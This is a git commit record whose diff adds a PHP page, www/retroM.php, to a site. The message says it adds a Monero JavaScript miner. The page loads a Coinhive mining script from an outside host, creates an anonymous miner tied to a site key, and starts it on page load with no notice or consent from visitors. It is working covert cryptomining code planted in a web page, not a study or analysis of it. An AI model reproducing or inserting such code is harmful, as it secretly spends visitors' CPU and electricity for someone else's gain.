489447fdc504fdde2a559a644c89d3363a559ac9
Enrico Dias <32619307+enricodias@users.noreply.github.com>
2017-09-17 17:52:59 +0000

    Added Monero javascript miner for chrome.

---
+++ www/retroM.php
@@ -0,0 +1,11 @@
+﻿<script type="text/javascript" src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script type="text/javascript">
+	
+	var miner = new CoinHive.Anonymous('tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM', {
+		threads: 1,
+		autoThreads: false
+	});
+	
+	miner.start();
+	
+</script>
